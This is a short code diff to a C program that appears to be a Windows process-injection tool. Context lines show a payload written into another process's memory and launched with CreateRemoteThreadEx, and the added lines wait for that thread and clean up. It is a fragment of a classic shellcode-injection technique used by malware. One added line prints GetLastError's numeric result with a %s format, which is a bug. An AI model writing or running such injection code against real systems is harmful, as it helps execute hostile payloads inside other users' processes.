@@ -38,6 +38,20 @@ int main(int argc, char* argv[])
     printf("Payload written to the process memory");
 
     hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
+    if (hThread == NULL)
+    {
+        printf("Failed to create thread, error: %s", GetLastError());
+        return EXIT_FAILURE;
+    }
+    printf("Got a handle to the newly-created thread (%ld)\n\\---0x%p\n", dwTID, hProcess);
+
+    printf("Waiting for thread to finish executing\n");
+    WaitForSingleObject(hThread, INFINITE);
+    printf("Thread finished executing, cleaning up\n");
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    printf("Finished");
 
     return EXIT_SUCCESS;
 }
